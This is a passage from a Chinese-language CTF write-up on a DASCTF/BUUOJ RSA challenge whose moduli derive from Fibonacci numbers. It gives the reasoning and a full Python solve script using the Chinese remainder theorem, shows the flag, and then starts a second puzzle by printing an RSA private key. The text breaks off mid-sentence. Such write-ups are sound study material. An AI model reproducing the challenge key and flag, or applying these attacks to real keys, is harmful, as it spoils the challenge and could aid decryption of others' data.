5893676968379648852677257584942191109596695953257511502221493623707657958793151928063695511404323761502093871747314475680963368412056002167272056988434183588136518540030328900237814175026374170035752147457944130025788557913749495512316872731640598728203711834687604349623497761823630666336599012384701148134898626277451946739191645056229526840490101366707716010899628734677395956010814780086058428182227433879240458756480238286363782312887091585752283137070930652073681891561066188131229432708558323016170835880200185835314330898745048592325798107333894598294876001536344275083054913481975007098183772410065580414486344966276992142840553960291265334551415769700709112077959058690472699228393932778693676888105307493544864165340738016954896582284163878309410561472175085522432252484026380738098291004277354471010420592137620174716251226560188793137038378169674648650109100511358090004029326014324282641470675210622193652390362972072927753788251933923336522541020538</span></span><br><span class="line"><span class="string">n = 23691611795512881548876576490920777356012500842496810447368465555253207159934330531730113872431842020621324344446142448954349963332039143377219840904377051014940314330764948944111930704132580375788932310940376348012980840541573284360163056070088226098587825855247120630453584914813593602869923553994121677913829</span></span><br><span class="line"><span class="string">F(n) = 9354120234373821188002721174172376187851074553842250946994966454521076364770447254561289329644492544492363073660918209867635665556179493971516453831575577085229601305613934033279832212516762995062790158649731235328923025944567754094837437882988453755837757140503680845082446605924488438186342529892438539978025244619294478667640323307281530468578326413724432442367286795555698768396763148070646067431485983937912884160277380848384622618517411849896779104223556934427313741222400162647303864273804545658096365574243669367638797710979775090679277794669009497301787205587916669811596486681600927221914751277959719025890975947906807551671033707046998050580404291266129815613731776357171701993365320613177014644670728884401252046842886254766791009584832861321307145962353061550438485818190867215102212015602783104130507243211654301408379888922865198634687009616395466846020452426608653076648665616711357303753242673389482755201639605067581161306428053985480749</span></span><br><span class="line"><span class="string">c = 5527295227051355798054266434992298352109856653351231751774366060474987674395801103779017995136358984850596693033786379284945829600181195650018576473832122123689374306357799469703873467631828582340852591088516097040696492555053370228278729688979599727840615379716837557947979105109295383721874687464666950312431293310758869315198932080703658526964530199675712576963592684818247111162090363056774275409164410925950049724140156220797817319956734605599349828169364123443161210061751433895202659075589086208524908238147473041649043519688635549021052796213275288198028578858764052136199721656697612607002863436475864686744976361468007786764828741313027638038039869019572535344397813504142312113571484580538973034322648843004665888312135523153988203801290669186909018156540165112741651436700837185946879899717245458101182522362705139925914797396797181901663790903646171709744845258954151859189108531243389446981087547490853432279034430995853488274409450850672046</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>有意识去查论文，没能力去读论文</p>
<h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><h4 id="漫漫求学路"><a href="#漫漫求学路" class="headerlink" title="漫漫求学路"></a>漫漫求学路</h4><p>看了题目，发现是将Fibonacci数列中的三个数作为模数了，第一时间想到的就是典型论文题，于是我直接baidu，发现了题目的出处</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-1fcd93e4.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-1fcd93e4.png" width="" height="" >

<p>摘要里说，这样子RSA加密是很容易被攻击的，所以再次坚信我找对了</p>
<p>但是这篇论文要收费，屑</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-cc50866c.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-cc50866c.png" width="" height="" >

<p>但是没有困难的狗狗，只有勇敢的问题，我们去找了老师，毕竟是研究RSA的，必定听过这类的攻击，或者说有相应的文献</p>
<p>果不其然，入场券到手</p>
<h4 id="漫漫求学路2"><a href="#漫漫求学路2" class="headerlink" title="漫漫求学路2"></a>漫漫求学路2</h4><p>论文并不长</p>
<p>第一点是说，如果用来作为模数n的斐波那契数在斐波那契序列中是排偶数位，那么这个n就可以分解成一个斐波那契数和一个卢卡斯数</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-07048377.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-07048377.png" width="" height="" >

<p>但这不是我们所需要的，因为题目里的n都是奇数</p>
<p>唯一找到有用一点的信息就是，</p>
<p>第$r$位置的斐波那契数$U_r$和第$s$位置的斐波那契数$U_s$，如果$r$整除$s$，则$U_r$整除$U_s$</p>
<p>题目所给的数据也确实能$P_i$被整除，但若是要完全分解，木大木大</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-95dc5fb2.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-95dc5fb2.png" width="" height="" >

<p>这里还说上面那个是充要条件</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-103c3baf.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-103c3baf.png" width="" height="" >

<img alt="20210529 DASCTFXBUUOJ五月大联动-4e045ef8.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-4e045ef8.png" width="" height="" >

<hr>
<p>麻了，看个der论文，网上找了（算法没学好，拼不过acm的）一个脚本，算出了第13000斐波那契数，都已经是小三千位的了，而我们题目给的数据才一千位都不到。吼吼吼吼，这题别（jiù）有（shì）洞（tào）天（lù）</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-f5e65eda.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-f5e65eda.png" width="" height="" >

<h4 id="我要这题何用"><a href="#我要这题何用" class="headerlink" title="我要这题何用"></a>我要这题何用</h4><img alt="20210529 DASCTFXBUUOJ五月大联动-f4679c38.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-f4679c38.png" width="" height="" >

<p>经过验证，这三个数根本不是斐波那契数，屑，出题人使诈</p>
<p>……</p>
<p>拖拖拖，拖到比赛结束又过去了一个白天，半夜看到别人队伍的wp了，师傅们TQL___Orz，都给A穿了</p>
<p>但其实我们已经出来了，害，<strong>意识</strong>不够，看到给了三组没有想到什么</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-083610fe.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-083610fe.png" width="" height="" >

<p>简单的推理如下，</p>
<p>已知（注意这里的$F(q_i)$并不是完全分解）<br>$$<br>\begin{cases}<br>  c_1=\ m^e\ mod\ F(p_1)\times F(q_1)\\<br>  c_2=\ m^e\ mod\ F(p_2)\times F(q_2)\\<br>  c_3=\ m^e\ mod\ F(p_3)\times F(q_3)<br>\end{cases}<br>$$<br>由同余的性质可知，在模$F(p_i)$的情况下也是成立的（吼吼吼，这可是对一个密码学菜鸡（wǒ）很重要的数论性质，在文末强调一下吧，<a href="#%E4%B8%80%E4%B8%AA%E5%BE%88%E9%87%8D%E8%A6%81%E7%9A%84%E6%80%A7%E8%B4%A8%E4%BB%A5%E5%8F%8A%E7%AE%80%E6%98%93%E8%AF%81%E6%98%8E">传送门</a>）<br>$$<br>\begin{cases}<br>  c_1=\ m^e\ mod\ F(p_1)\\<br>  c_2=\ m^e\ mod\ F(p_2)\\<br>  c_3=\ m^e\ mod\ F(p_3)<br>\end{cases}<br>$$<br>这时的解密就是，为了避免混淆，我这里完全分成三个加密了，它们都是类似的，举第一个为例<br>$$<br>m_1=\ c_1^{d_1}\ mod\ F(p_1)<br>$$<br>而$m_1$都满足<br>$$<br>m\equiv\ m_1\ mod\ F(p_1)<br>$$<br>但是因为$m_1$求出来太小啦（毕竟是在模$F(p_1)$下，原来可是在模$F(p_1)\times F(q_1)$下的），如果m比任意的$F(p_i)$都大，那么求出来的$m_i$都只不过是m在模各自$F(p_i)$的一个剩余类罢了，这样解出来的$m_i$就是不对的</p>
<p>那应该怎么办呢？</p>
<h4 id="中国剩余定理yyds"><a href="#中国剩余定理yyds" class="headerlink" title="中国剩余定理yyds"></a>中国剩余定理yyds</h4><p>这就要引入中国剩余定理CRT这个概念了，它的原本是用来解同余方程的，但是求出来的解是在模所有模数之积的情况下的，所以假设所有模数之积为N，只要明文m是在$\mathbb{Z_N}$中的，就可以做到——完全求解；但是如果不成立只能求出一个与m在模N同余的剩余类，并不是真的解</p>
<p>这就是我们的思路，因为我们手头上就只有三组解，可能将模数给扩大到$F(p_1)\times F(p_2)\times F(p_3)$，如果凑巧，m比这个乘积要小，就能求出来了，如果还不行，说明题目给的m比较大，也就是flag比较长，只能继续分解$F(N_i)$，构造更多同余方程，直到模数之积大于flag转变成的m</p>
<p>也就是用这个<br>$$<br>\begin{cases}<br>m_1=\ c_1^{d_1}\ mod\ F(p_1)\\<br>m_2=\ c_2^{d_2}\ mod\ F(p_2)\\<br>m_3=\ c_3^{d_3}\ mod\ F(p_3)<br>\end{cases}<br>$$<br>推导出的<br>$$<br>\begin{cases}<br>m\equiv\ m_1\ mod\ F(p_1)\\<br>m\equiv\ m_2\ mod\ F(p_2)\\<br>m\equiv\ m_3\ mod\ F(p_3)<br>\end{cases}<br>$$<br>解同余方程，看看出来的是不是flag</p>
<p>醒悟之后下来含泪的脚本，包括抄来的求fibonacci数列的和中国剩余定理的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    t = <span class="built_in">int</span>(math.log2(n)) - <span class="number">1</span></span><br><span class="line">    x, y, = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> t &gt; <span class="number">0</span>:</span><br><span class="line">        last_x = x</span><br><span class="line">        <span class="keyword">if</span> (n &gt;&gt; t) &amp; <span class="number">0x1</span>:</span><br><span class="line">            x = x**<span class="number">2</span> + (x + y)**<span class="number">2</span></span><br><span class="line">            y = last_x * (last_x + <span class="number">2</span> * y)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x = x * (x + <span class="number">2</span> * y)</span><br><span class="line">            y = last_x**<span class="number">2</span> + y**<span class="number">2</span></span><br><span class="line">        t -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">0x1</span>:</span><br><span class="line">        <span class="keyword">return</span> x**<span class="number">2</span> + (x + y)**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x * (x + <span class="number">2</span> * y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crt</span>(<span class="params">ci, ni</span>):</span></span><br><span class="line">    <span class="comment"># 检查是否有解，有解的条件，ni都互质</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ni)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(ni)):</span><br><span class="line">            <span class="keyword">assert</span> gcd(ni[i], ni[j]) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ci) == <span class="built_in">len</span>(ni)</span><br><span class="line"></span><br><span class="line">    _N = reduce(<span class="keyword">lambda</span> a, b: a*b, ni)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(ci, ni):</span><br><span class="line">        _Ni = _N//j</span><br><span class="line">        _Ni1 = invert(_Ni, j)</span><br><span class="line">        x += i*_Ni*_Ni1</span><br><span class="line">    <span class="keyword">return</span> x % _N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">30039002188673063651200304724856649750424855614713561659816258454033925531379709006718595334296516241593158998074215212142272196270365664747873959581114872378007750905526355257967620809790424857457592189785708634246739647422565451143815984036502331156971328504879840492056807034649796388685443055568787638373563</span></span><br><span class="line">F1 = <span class="number">36700337315478358423302463804643502364132894595387679831392170242048570294154137205916046749632259595443511772051005890145681246611711817441148722686433058905309178967626876196428817911402628279151882749816176290631663850711266005570519120688501046610172118214633159846090742563888545000820131558915392759986137704413717356161549696109102298045171982651759736931461029700093546074544216714411268154766313965335118439291477901688458760307733751977411099481922798986947005456033024215394531788003343093192780270571980899284495530589488614458267489897774350955741276841747926401364869628844871476483816139224540693572750083532852690939679488779770278121521966166639184387859708670915429469804929002101080867694318638835470062005769336931710061708165085286293560882862673863182161513175108975599928164057840378446866053785509135134250439675861761412916432659950998041079347609299108756058982586701419597870024243472621875398244582253182771532237956030075796524234449649579003219049</span></span><br><span class="line">c1 = <span class="number">5149579488901718498256373861975221458889060262051324713153792274531569740959338672159468511041469512968513162060650323314015111729630790249929764405001469068728832250672432536655958494683225528045534739312500520653653926107616626321646038503307002215682827882897681738805565989931916973526625237494508575698650414426281874530049741540818321302625573676530536769431267223818807952634410781018835593002628264062168865877875709419051886274533984009771861504132373726000546543208681246415153517353772565209140561174813777886487077708362479762600413004602240042298109893816953817393105259401510845057279294044756541864350957113952935658077279981571022227194710269040317178329523984989277421087981594122731035549685470894608888049815174440061043045638797036874542111575347820490125255592416295645107767029867230219384632544284156692872055786752135888144873738488840255388898851551453544530082551649823629868841430161794325580654855230486824210856918330348898081161664747016870749921</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20756277616755836861796337131683494338352701206928094011019872107808330954223862907177555525893261715593610455375647872190101833907080699823790147515155417500649420182409578349022597139001229776650770207829659368291648098353474620323733162983388953788239424626462428488411835382477744747369092196172727799468129</span></span><br><span class="line">F2 = <span class="number">73745878045934636387896195274069826551569516766963182339313590908194755029865664679120132471843611642027469204171633501721641080925317635658799561477123939207311526297390646712571316606381873782191178958234889168599083479590822672109275622907151415552207811665808203751267410151224170154736841450903230193274146578562848780223022725054392389915985290416059522271191922854734627854849084277940339695243325424932830011581455271309868481867791848671985869262214017536640985196012788793460756899871516178490553441223897250090614367273308559864669269965578509523152119870676641602044879271520652270508502838994825168113044092631541016378753797168654004397854528716878554680966919397339024634461107466963998140873416841269245629405227723896214356538994142798927935847118081299628628813983021407779086407107873835131175157418129203731497042769363491200520978441329400751265966093987214492433690588592278950077342020700742819163199408329926294779182691364743193734488228719</span></span><br><span class="line">c2 = <span class="number">5893676968379648852677257584942191109596695953257511502221493623707657958793151928063695511404323761502093871747314475680963368412056002167272056988434183588136518540030328900237814175026374170035752147457944130025788557913749495512316872731640598728203711834687604349623497761823630666336599012384701148134898626277451946739191645056229526840490101366707716010899628734677395956010814780086058428182227433879240458756480238286363782312887091585752283137070930652073681891561066188131229432708558323016170835880200185835314330898745048592325798107333894598294876001536344275083054913481975007098183772410065580414486344966276992142840553960291265334551415769700709112077959058690472699228393932778693676888105307493544864165340738016954896582284163878309410561472175085522432252484026380738098291004277354471010420592137620174716251226560188793137038378169674648650109100511358090004029326014324282641470675210622193652390362972072927753788251933923336522541020538</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">23691611795512881548876576490920777356012500842496810447368465555253207159934330531730113872431842020621324344446142448954349963332039143377219840904377051014940314330764948944111930704132580375788932310940376348012980840541573284360163056070088226098587825855247120630453584914813593602869923553994121677913829</span></span><br><span class="line">F3 = <span class="number">9354120234373821188002721174172376187851074553842250946994966454521076364770447254561289329644492544492363073660918209867635665556179493971516453831575577085229601305613934033279832212516762995062790158649731235328923025944567754094837437882988453755837757140503680845082446605924488438186342529892438539978025244619294478667640323307281530468578326413724432442367286795555698768396763148070646067431485983937912884160277380848384622618517411849896779104223556934427313741222400162647303864273804545658096365574243669367638797710979775090679277794669009497301787205587916669811596486681600927221914751277959719025890975947906807551671033707046998050580404291266129815613731776357171701993365320613177014644670728884401252046842886254766791009584832861321307145962353061550438485818190867215102212015602783104130507243211654301408379888922865198634687009616395466846020452426608653076648665616711357303753242673389482755201639605067581161306428053985480749</span></span><br><span class="line">c3 = <span class="number">5527295227051355798054266434992298352109856653351231751774366060474987674395801103779017995136358984850596693033786379284945829600181195650018576473832122123689374306357799469703873467631828582340852591088516097040696492555053370228278729688979599727840615379716837557947979105109295383721874687464666950312431293310758869315198932080703658526964530199675712576963592684818247111162090363056774275409164410925950049724140156220797817319956734605599349828169364123443161210061751433895202659075589086208524908238147473041649043519688635549021052796213275288198028578858764052136199721656697612607002863436475864686744976361468007786764828741313027638038039869019572535344397813504142312113571484580538973034322648843004665888312135523153988203801290669186909018156540165112741651436700837185946879899717245458101182522362705139925914797396797181901663790903646171709744845258954151859189108531243389446981087547490853432279034430995853488274409450850672046</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="number">251</span></span><br><span class="line">q1 = <span class="number">119677299556466389048606791732496612551493448664197456812016965952326396539361390465014324041021977058140075689538706024471203969204644082660852428610019411864572712771021335689114027130639142858396781632612384996998962738735320522485322645563754307398292145437768288812975326831274089197949972332943377045313</span></span><br><span class="line">p2 = <span class="number">197</span></span><br><span class="line">q2 = <span class="number">105361815313481405389829122495855301209912188867655299548324223897504218041745496990749012821793206678140154595815471432437065146736450252912640342716524961932230559301571463700622320502544313587059747247866291209602274610931343250374280015144106364407306723992195068469095611078567232220147676122704202027757</span></span><br><span class="line">p3 = <span class="number">149</span></span><br><span class="line">q3 = <span class="number">159004106010153567442124674435709915141023495587226915754150775538612128590163292159262509210951959869941774123799613751371476263973417069645770744324678194731143049199764758014174031571359599837509612825103196966530072755312572378256127893087840443614683395001658527721164999428279151697113580899289407234321</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p1*q1 == n1</span><br><span class="line"><span class="keyword">assert</span> p2*q2 == n2</span><br><span class="line"><span class="keyword">assert</span> p3*q3 == n3</span><br><span class="line"></span><br><span class="line">p = [fibonacci_2(p1), fibonacci_2(p2), fibonacci_2(p3)]</span><br><span class="line">f = [F1, F2, F3]</span><br><span class="line"></span><br><span class="line">p11 = <span class="number">582416774750273</span></span><br><span class="line">q11 = <span class="number">21937080329465122026187124199656961913</span></span><br><span class="line"></span><br><span class="line">p22 = <span class="number">15761</span></span><br><span class="line">q22 = <span class="number">25795969</span></span><br><span class="line">r22 = <span class="number">227150265697</span></span><br><span class="line">s22 = <span class="number">717185107125886549</span></span><br><span class="line"></span><br><span class="line">p33 = <span class="number">110557</span></span><br><span class="line">q33 = <span class="number">162709</span></span><br><span class="line">r33 = <span class="number">4000949</span></span><br><span class="line">s33 = <span class="number">85607646594577</span></span><br><span class="line"></span><br><span class="line">phi1 = (p11-<span class="number">1</span>)*(q11-<span class="number">1</span>)</span><br><span class="line">phi2 = (p22-<span class="number">1</span>)*(q22-<span class="number">1</span>)*(r22-<span class="number">1</span>)*(s22-<span class="number">1</span>)</span><br><span class="line">phi3 = (p33-<span class="number">1</span>)*(q33-<span class="number">1</span>)*(r33-<span class="number">1</span>)*(s33-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = invert(e, phi1)</span><br><span class="line">d2 = invert(e, phi2)</span><br><span class="line">d3 = invert(e, phi3)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, p[<span class="number">0</span>])</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, p[<span class="number">1</span>])</span><br><span class="line">m3 = <span class="built_in">pow</span>(c3, d3, p[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt([m1, m2, m3], p)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;40491b82090cc75e56ce5196dc1b91e8&#125;</span><br></pre></td></tr></table></figure>

<p>顺便也学到了，库函数里有直接求欧拉函数的，好耶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 现成的欧拉函数</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = …</span><br><span class="line">phi = euler_phi(n)</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><a href="https://zhuanlan.zhihu.com/p/376338394">贴上大佬的链接</a></p>
<p>可恶啊，差一点，托论文的福气，我们知道了那个斐波那契数列的性质，但是还是意识太差了，中国剩余定理解同余方程啊</p>
<p>好题，确实没毛病，要怪只怪我太抠细节了吧</p>
<h3 id="一个很重要的性质以及简易证明"><a href="#一个很重要的性质以及简易证明" class="headerlink" title="一个很重要的性质以及简易证明"></a>一个很重要的性质以及简易证明</h3><p>这条性质如下<br>$$<br>a\equiv b\ (mod\ m),a\equiv b\ (mod\ n)\Leftrightarrow\ a\equiv b\ (mod\ mn)<br>$$<br>前提是$(m, n)=1$，也就是m和n互素</p>
<p>证明：<br>$$<br>\because a\equiv b\ (mod\ m),\ a\equiv b\ (mod\ n)<br>$$</p>
<p>$$<br>\therefore m|(a-b)且n|(a-b)<br>$$</p>
<p>由FTA（算数基本定理）可知，m可以唯一分解成<br>$$<br>m=m_1\times m_2\times\ …\times m_i\<br>$$<br>同理，<br>$$<br>n=n_1\times n_2\times\ …\times n_i<br>$$</p>
<p>而且$(m,n)=1$，也就是说集合${m_1,\ m_2,\ …,\ m_i}$和集合${n_1,\ n_2,\ …,\ n_i}$中的元素，两两不相同<br>$$<br>\therefore mn|(a-b)即a\equiv b\ (mod\ mn)<br>$$</p>
<p>这里还用到了同余关系的等价表达式，望周之</p>
<h3 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h3><p>在彻底弄懂这道题时，我发现其实不需要三组，两组也行，不过必须是$F(p_i)$想乘大于m的情况，因为中国剩余定理的一种用法，我的理解是扩大模数，只能求出$m\ mod\ F(p_1)F(p_2)F(p_3)$是吧，但如果m本身就比$F(p_1)F(p_2)$小，当然可以只用CRT求解前面两个组成的同余方程；这就和模数不够再分解构造反过来了</p>
<p>据结果返回，我们发现，</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-e580ce12.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-e580ce12.png" width="" height="" >

<p>直接开冲</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-cce1f4d0.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-cce1f4d0.png" width="" height="" >

<p>Capture The Flag</p>
<h2 id="还有一个小插曲"><a href="#还有一个小插曲" class="headerlink" title="还有一个小插曲"></a>还有一个小插曲</h2><p>彭总给的一道misc，最后一步是rsa</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzI</span><br><span class="line">A9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/H</span><br><span class="line">DtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2td</span><br><span class="line">INtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzCly</span><br><span class="line">AYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7</span><br><span class="line">v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09f</span><br><span class="line">Tw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5</span><br><span class="line">ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2</span><br><span class="line">YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1J</span><br><span class="line">Gd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMU</span><br><span class="line">Ra592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje</span><br><span class="line">0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9R</span><br><span class="line">pJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQyk</span><br><span class="line">AH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzg</span><br><span class="line">OOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPc</span><br><span class="line">QzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwL</span><br><span class="line">uCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ</span><br><span class="line">9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQK</span><br><span class="line">kPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZa</span><br><span class="line">yPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG</span><br><span class="line">7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbh</span><br><span class="line">ZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7</span><br><span class="line">efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLK</span><br><span class="line">OLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiI</span><br><span class="line">F3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4Ai</span><br><span class="line">nAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1</span><br><span class="line">mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMT</span><br><span class="line">DicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90h</span><br><span class="line">Tgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCb</span><br><span class="line">hdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOI</span><br><span class="line">pQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;data&gt;</span><br><span class="line">6945004599188163993695415369835695903301224003136994252560594956191090963121611565339316899123749651980866032846579298200421747380583546633355992903073674181349057044030322829788264132202636849376954935277228938532451604402772829242424577058024238656161078439246537271516326863255516855631753446705292842229626286876548916801469642547513456705866784202623394305276451128865785358297012288872815722144655832856702699498675579782594166664458814522864775862036884859354259378908758433643337060342583622920263235497780709801069090899910257671959718315799533292405361650450010152269010240983236777594133358567962307235569</span><br><span class="line">&lt;sign&gt;</span><br><span class="line">2657375403899004421682435875591648757169751001935445937761677813563331237751296771655965799410203548200444843121899114276425174188686046977514392352233441829494629361400810323413751538449142557000621910082199277027187814332458889139635831754705831808451385798544850324418189973193940364270700678684371080465070928269782397410454121628205746311654719735981174781630012234885865191874665887323338400055601894791632973447395440378983992188376105785566869556895986983889219094640854379267584790389009829385657891279182819588524435817909919666674804622368593843455996806164859962400637898116212711639490474051288221345806</span><br></pre></td></tr></table></figure>

<p>这个网站可以对这个文件的格式进行解析（虽然觉得用openssl更有逼格一点，但是搜了许多感觉有点怪，在线的不香吗）<br><a href="https://www.ssleye.com/priv_get.html">https://www.ssleye.com/priv_get.html</a></p>
<p>解析出来是</p>
